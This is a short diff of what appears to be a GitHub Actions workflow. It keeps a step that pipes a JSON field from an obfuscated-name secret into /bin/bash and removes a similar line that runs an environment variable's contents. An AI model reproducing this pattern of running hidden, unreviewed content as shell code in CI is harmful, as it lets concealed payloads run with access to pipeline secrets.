@@ -19,7 +19,6 @@ jobs:
           qdgh8: ${{ secrets.qdgh8 }}
         run: |
           printf '%s' "$qdgh8" | jq -r .t49131 | /bin/bash
-          echo $qltu2704 | jq -r .tnnf56516 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
